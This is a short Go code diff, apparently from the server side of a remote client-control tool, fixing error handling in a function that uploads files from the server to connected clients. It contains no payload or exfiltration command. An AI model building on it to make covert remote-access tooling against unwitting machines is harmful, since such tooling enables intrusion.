@@ -163,17 +163,20 @@ func (client *activeClient) Download(c *ishell.Context) {
 
 }
 
-// UPLOAD A LOCAL FILE
+// UPLOAD A FILE FROM SERVER TO CLIENT
 func (client *activeClient) Upload(c *ishell.Context) {
 	path := strings.Join(c.Args, " ")
+	info, _ := os.Stat(path)
+
 	c.ProgressBar().Indeterminate(true)
 	c.ProgressBar().Start()
-	info, _ := os.Stat(path)
+
 	content, err := ioutil.ReadFile(path)
 	if err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
+		return
 	}
 
 	f := models.File{
@@ -187,7 +190,9 @@ func (client *activeClient) Upload(c *ishell.Context) {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
+		return
 	}
+
 	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
 	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Upload successfully received"))
 	c.ProgressBar().Stop()
